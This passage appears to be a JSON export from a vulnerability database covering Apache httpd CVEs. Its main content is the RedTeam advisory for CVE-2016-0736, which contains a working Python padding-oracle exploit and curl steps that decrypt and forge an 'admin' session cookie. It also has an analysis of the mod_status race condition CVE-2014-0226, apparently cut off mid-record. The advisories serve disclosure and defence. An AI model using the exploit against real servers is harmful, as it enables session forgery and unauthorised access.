number requested  \n2016-01-20 Vendor notified  \n2016-01-22 Vendor confirmed the vulnerability  \n2016-02-03 Vendor provided patch  \n2016-02-04 Apache Security Team assigned CVE number  \n2016-03-03 Requested status update from vendor, no response  \n2016-05-02 Requested status update from vendor, no response  \n2016-07-14 Requested status update and roadmap from vendor  \n2016-07-21 Vendor confirms working on a new released and inquired whether the  \npatch fixes the vulnerability  \n2016-07-22 RedTeam confirms  \n2016-08-24 Requested status update from vendor  \n2016-08-29 Vendor states that there is no concrete timeline  \n2016-12-05 Vendor announces a release  \n2016-12-20 Vendor released fixed version  \n2016-12-23 Advisory released  \n  \n  \nReferences  \n==========  \n  \n[1] https://github.com/mwielgoszewski/python-paddingoracle  \n[2] http://httpd.apache.org/security/vulnerabilities_24.html  \n  \n  \nRedTeam Pentesting GmbH  \n=======================  \n  \nRedTeam Pentesting offers individual penetration tests performed by a  \nteam of specialised IT-security experts. Hereby, security weaknesses in  \ncompany networks or products are uncovered and can be fixed immediately.  \n  \nAs there are only few experts in this field, RedTeam Pentesting wants to  \nshare its knowledge and enhance the public knowledge with research in  \nsecurity-related areas. The results are made available as public  \nsecurity advisories.  \n  \nMore information about RedTeam Pentesting can be found at:  \nhttps://www.redteam-pentesting.de/  \n  \n--   \nRedTeam Pentesting GmbH Tel.: +49 241 510081-0  \nDennewartstr. 25-27 Fax : +49 241 510081-99  \n52068 Aachen https://www.redteam-pentesting.de  \nGermany Registergericht: Aachen HRB 14004  \nGeschaftsfuhrer: Patrick Hof, Jens Liebchen  \n`\n",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:140265"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache mod_session_crypto - Padding Oracle. CVE-2016-0736. Webapps exploit for Multiple platform",
            "modified": "2016-12-23T00:00:00",
            "published": "2016-12-23T00:00:00",
            "id": "EDB-ID:40961",
            "href": "https://www.exploit-db.com/exploits/40961/",
            "type": "exploitdb",
            "title": "Apache mod_session_crypto - Padding Oracle",
            "sourceData": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:40961"
        }
    ],
    "CVE-2014-0098": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 66303\r\nCVE ID: CVE-2013-6438,CVE-2014-0098\r\n\r\nApache HTTP Server\u662f\u5f00\u6e90HTTP\u670d\u52a1\u5668\u3002 \r\n\r\nApache HTTP Server 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u88ab\u6076\u610f\u5229\u7528\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\r\n\r\n1\u3001\u8bb0\u5f55\u622a\u65adcookie\u65f6\uff0cmod_log_config\u6a21\u5757\u5b58\u5728\u9519\u8bef\uff0c\u53ef\u88ab\u5229\u7528\u9020\u6210\u5de5\u4f5c\u7ebf\u7a0b\u5d29\u6e83\u3002\u8981\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u9700\u8981\u4f7f\u7528\u7ebf\u7a0b\u5316MPM\u3002\r\n2\u3001\u5220\u9664\u524d\u5bfc\u7a7a\u683c\u65f6\uff0cmod_dav\u6a21\u5757\u5b58\u5728\u8fb9\u754c\u9519\u8bef\uff0c\u53ef\u88ab\u5229\u7528\u901a\u8fc7\u7279\u5236\u7684DAV WRITE\u8bf7\u6c42\u7834\u574f\u5185\u5b58\u3002\n0\nApache Group Apache HTTP Server &lt; 2.4.9\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\nhttp://httpd.apache.org/",
            "modified": "2014-03-20T00:00:00",
            "published": "2014-03-20T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61874",
            "id": "SSV:61874",
            "type": "seebug",
            "title": "Apache HTTP Server\u591a\u4e2a\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61874"
        }
    ],
    "CVE-2013-6438": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 66303\r\nCVE ID: CVE-2013-6438,CVE-2014-0098\r\n\r\nApache HTTP Server\u662f\u5f00\u6e90HTTP\u670d\u52a1\u5668\u3002 \r\n\r\nApache HTTP Server 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u88ab\u6076\u610f\u5229\u7528\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\r\n\r\n1\u3001\u8bb0\u5f55\u622a\u65adcookie\u65f6\uff0cmod_log_config\u6a21\u5757\u5b58\u5728\u9519\u8bef\uff0c\u53ef\u88ab\u5229\u7528\u9020\u6210\u5de5\u4f5c\u7ebf\u7a0b\u5d29\u6e83\u3002\u8981\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u9700\u8981\u4f7f\u7528\u7ebf\u7a0b\u5316MPM\u3002\r\n2\u3001\u5220\u9664\u524d\u5bfc\u7a7a\u683c\u65f6\uff0cmod_dav\u6a21\u5757\u5b58\u5728\u8fb9\u754c\u9519\u8bef\uff0c\u53ef\u88ab\u5229\u7528\u901a\u8fc7\u7279\u5236\u7684DAV WRITE\u8bf7\u6c42\u7834\u574f\u5185\u5b58\u3002\n0\nApache Group Apache HTTP Server &lt; 2.4.9\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\nhttp://httpd.apache.org/",
            "modified": "2014-03-20T00:00:00",
            "published": "2014-03-20T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61874",
            "id": "SSV:61874",
            "type": "seebug",
            "title": "Apache HTTP Server\u591a\u4e2a\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61874"
        }
    ],
    "CVE-2014-0226": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache 2.4.7 mod_status Scoreboard Handling Race Condition. CVE-2014-0226. Dos exploit for linux platform",
            "modified": "2014-07-21T00:00:00",
            "published": "2014-07-21T00:00:00",
            "id": "EDB-ID:34133",
            "href": "https://www.exploit-db.com/exploits/34133/",
            "type": "exploitdb",
            "title": "Apache 2.4.7 mod_status Scoreboard Handling Race Condition",
            "sourceData": "--[ 0. Sparse summary\r\nRace condition between updating httpd's \"scoreboard\" and mod_status,\r\nleading to several critical scenarios like heap buffer overflow with\r\nuser\r\nsupplied payload and leaking heap which can leak critical memory\r\ncontaining\r\nhtaccess credentials, ssl certificates private keys and so on.\r\n--[ 1. Prerequisites\r\n\r\nApache httpd compiled with MPM event or MPM worker.\r\nThe tested version was 2.4.7 compiled with:\r\n\r\n    ./configure --enable-mods-shared=reallyall --with-included-apr\r\n\r\nThe tested mod_status configuration in httpd.conf was:\r\n        SetHandler server-status\r\n    ExtendedStatus On\r\n--[ 2. Race Condition\r\n\r\nFunction ap_escape_logitem in server/util.c looks as follows:\r\n\r\n    1908AP_DECLARE(char *) ap_escape_logitem(apr_pool_t *p, const char\r\n*str)\r\n    1909{\r\n    1910    char *ret;\r\n    1911    unsigned char *d;\r\n    1912    const unsigned char *s;\r\n    1913    apr_size_t length, escapes = 0;\r\n    1914\r\n    1915    if (!str) {\r\n    1916        return NULL;\r\n    1917    }\r\n    1918\r\n    1919    /* Compute how many characters need to be escaped */\r\n    1920    s = (const unsigned char *)str;\r\n    1921    for (; *s; ++s) {\r\n    1922        if (TEST_CHAR(*s, T_ESCAPE_LOGITEM)) {\r\n    1923            escapes++;\r\n    1924        }\r\n    1925    }\r\n    1926\r\n    1927    /* Compute the length of the input string, including NULL\r\n*/\r\n    1928    length = s - (const unsigned char *)str + 1;\r\n    1929\r\n    1930    /* Fast path: nothing to escape */\r\n    1931    if (escapes == 0) {\r\n    1932        return apr_pmemdup(p, str, length);\r\n    1933    }\r\n\r\nIn the for-loop between 1921 and 1925 lines function is computing the\r\nlength of\r\nsupplied str (almost like strlen, but additionally it counts special\r\ncharacters\r\nwhich need to be escaped). As comment in 1927 value says, function\r\ncomputes count\r\nof bytes to copy. If there's nothing to escape function uses\r\napr_pmemdup to duplicate\r\nthe str. In our single-threaded mind everything looks good, but tricky\r\npart starts\r\nwhen we introduce multi-threading. Apache in MPM mode runs workers as\r\nthreads, let's\r\nconsider the following scenario:\r\n\r\n    1) ap_escape_logitem(pool, \"\") is called\r\n    2) for-loop in 1921 line immediately escapes, because *s is  in\r\nfirst loop run\r\n    3) malicious thread change memory under *s to another value\r\n(something which is not )\r\n    4) apr_pmemdup copies that change value to new string and returns\r\nit\r\n\r\nOutput from the ap_escape_logitem is considered to be a string, if\r\nscenario above would occur,\r\nthen returned string would not be zeroed at the end, which may be\r\nharmful. The mod_status\r\ncode looks as follows:\r\n\r\n    833                    ap_rprintf(r, \"%s%s\"\r\n    834                                  \"%snn\",\r\n    835                               ap_escape_html(r->pool,\r\n    836                                             \r\nws_record->client),\r\n    837                               ap_escape_html(r->pool,\r\n    838                                             \r\nws_record->vhost),\r\n    839                               ap_escape_html(r->pool,\r\n    840                                             \r\nap_escape_logitem(r->pool,\r\n    841                                                     \r\nws_record->request)));\r\n\r\nThe relevant call to ap_escape_html() is at line 839 after the\r\nevaluation of ap_escape_logitem().\r\nThe first argument passed to the ap_escape_logitem() is in fact an apr\r\npool associated with\r\nthe HTTP request and defined in the request_rec structure.\r\n\r\nThis code is a part of a larger for-loop where code is iterating over\r\nworker_score structs which is\r\ndefined as follows:\r\n\r\n    90struct worker_score {\r\n    91#if APR_HAS_THREADS\r\n    92    apr_os_thread_t tid;\r\n    93#endif\r\n    94    int thread_num;\r\n    95    /* With some MPMs (e.g., worker), a worker_score can\r\nrepresent\r\n    96     * a thread in a terminating process which is no longer\r\n    97     * represented by the corresponding process_score.  These\r\nMPMs\r\n    98     * should set pid and generation fields in the worker_score.\r\n    99     */\r\n    100    pid_t pid;\r\n    101    ap_generation_t generation;\r\n    102    unsigned char status;\r\n    103    unsigned short conn_count;\r\n    104    apr_off_t     conn_bytes;\r\n    105    unsigned long access_count;\r\n    106    apr_off_t     bytes_served;\r\n    107    unsigned long my_access_count;\r\n    108    apr_off_t     my_bytes_served;\r\n    109    apr_time_t start_time;\r\n    110    apr_time_t stop_time;\r\n    111    apr_time_t last_used;\r\n    112#ifdef HAVE_TIMES\r\n    113    struct tms times;\r\n    114#endif\r\n    115    char client[40];            /* Keep 'em small... but large\r\nenough to hold an IPv6 address */\r\n    116    char request[64];           /* We just want an idea... */\r\n    117    char vhost[32];             /* What virtual host is being\r\naccessed? */\r\n    118};\r\n\r\nThe 'request' field in a worker_score structure is particularly\r\ninteresting - this field can be changed inside\r\nthe copy_request function, which is called by the\r\nupdate_child_status_internal. This change may occur when the\r\nmod_status is iterating over the workers at the same time the\r\nap_escape_logitem is called within a different\r\nthread, leading to a race condition. We can trigger this exact\r\nscenario in order to return a string without a\r\ntrailing . This can be achived by running two clients, one triggering\r\nthe mod_status handler and second\r\nsending random requests to the web server. Let's consider the\r\nfollowing example:\r\n\r\n    1) the mod_status iterates over workers invoking\r\nupdate_child_status_internal()\r\n    2) at some point for one worker mod_status calls\r\nap_escape_logitem(pool, ws_record->request)\r\n    3) let's asume that ws_record->request at the beginning is \"\"\r\nliterally  at the first byte.\r\n    4) inside the ap_escape_logitem function the length of the\r\nws_record->request is computed, which is 1\r\n       (an empty string consisting of )\r\n    5) another thread modifies ws_record->request (in fact it's called\r\nws->request in update_child_status_internal\r\n       function but it's exactly the same location in memory) and puts\r\nthere i.e. \"GET / HTTP/1.0\"\r\n    6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the\r\nfirst one byte from \"GET / HTTP/1.0\" - \"G\" in\r\n       that case and returns it. The ap_pmemdup looks as follows:\r\n\r\n       112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void\r\n*m, apr_size_t n)\r\n       113{\r\n       114    void *res;\r\n       115\r\n       116    if (m == NULL)\r\n       117      return NULL;\r\n       118    res = apr_palloc(a, n);\r\n       119    memcpy(res, m, n);\r\n       120    return res;\r\n\r\n       It allocates memory using apr_palloc function which returns\r\n\"ditry\" memory (note that apr_pcalloc overwrite\r\n       allocated memory with NULs).\r\n\r\n       So it's non-deterministic what's after the copied \"G\" byte.\r\nThere might be  or might be not. For now let's\r\n       assume that the memory allocated by apr_palloc was dirty\r\n(containing random bytes).\r\n    7) ap_escape_logitem returns \"G.....\" .junk. \"\"\r\n\r\nThe value from the example above is then pushed to the ap_escape_html2\r\nfunction which is also declared in util.c:\r\n\r\n    1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char\r\n*s, int toasc)\r\n    1861{\r\n    1862    int i, j;\r\n    1863    char *x;\r\n    1864\r\n    1865    /* first, count the number of extra characters */\r\n    1866    for (i = 0, j = 0; s[i] != ''; i++)\r\n    1867        if (s[i] == '')\r\n    1868            j += 3;\r\n    1869        else if (s[i] == '&')\r\n    1870            j += 4;\r\n    1871        else if (s[i] == '\"')\r\n    1872            j += 5;\r\n    1873        else if (toasc && !apr_isascii(s[i]))\r\n    1874            j += 5;\r\n    1875\r\n    1876    if (j == 0)\r\n    1877        return apr_pstrmemdup(p, s, i);\r\n    1878\r\n    1879    x = apr_palloc(p, i + j + 1);\r\n    1880    for (i = 0, j = 0; s[i] != ''; i++, j++)\r\n    1881        if (s[i] == '') {\r\n    1886            memcpy(&x[j], \">\", 4);\r\n    1887            j += 3;\r\n    1888        }\r\n    1889        else if (s[i] == '&') {\r\n    1890            memcpy(&x[j], \"&\", 5);\r\n    1891            j += 4;\r\n    1892        }\r\n    1893        else if (s[i] == '\"') {\r\n    1894            memcpy(&x[j], \"\"\", 6);\r\n    1895            j += 5;\r\n    1896        }\r\n    1897        else if (toasc && !apr_isascii(s[i])) {\r\n    1898            char *esc = apr_psprintf(p, \"&#%3.3d;\", (unsigned\r\nchar)s[i]);\r\n    1899            memcpy(&x[j], esc, 6);\r\n    1900            j += 5;\r\n    1901        }\r\n    1902        else\r\n    1903            x[j] = s[i];\r\n    1904\r\n    1905    x[j] = '';\r\n    1906    return x;\r\n    1907}\r\n\r\nIf the string from the example above would be passed to this function\r\nwe should get the following code-flow:\r\n\r\n    1) in the for-loop started in line 1866 we count the length of\r\nescaped string\r\n    2) because 's' string contains junk (due to only one byte being\r\nallocated by the apr_palloc function),\r\n       it may contain '>' character. Let's assume that this is our\r\ncase\r\n    3) after for-loop in 1866 line 'j' is greater than 0 (at least one\r\ns[i] equals '>' as assumed above\r\n    4) in the 1879 line memory for escaped 'd' string is allocated\r\n    5) for-loop started in line 1880 copies string 's' to the escaped\r\n'd' string BUT apr_palloc has allocated\r\n       only one byte for 's'. Thus, for each i > 0 the loop reads\r\nrandom memory and copies that value\r\n       to 'd' string. At this point it's possible to trigger an\r\ninformation leak vulnerability (see section 5).\r\n\r\nHowever the 's' string may overlap with 'd' i.e.:\r\n\r\n    's' is allocated under 0 with contents s = \"AAAAAAAA>\"\r\n    'd' is allocated under 8 then s[8] = d[0].\r\n\r\nIf that would be the case, then for-loop would run forever (s[i] never\r\nwould be  since it was overwritten in the loop\r\nby non-zero). Forever... until it hits an unmapped memory or read only\r\narea.\r\n\r\nPart of the scoreboard.c code which may overwrite the\r\nws_record->request was discovered using a tsan:\r\n\r\n    #1 ap_escape_logitem ??:0 (exe+0x0000000411f2)\r\n    #2 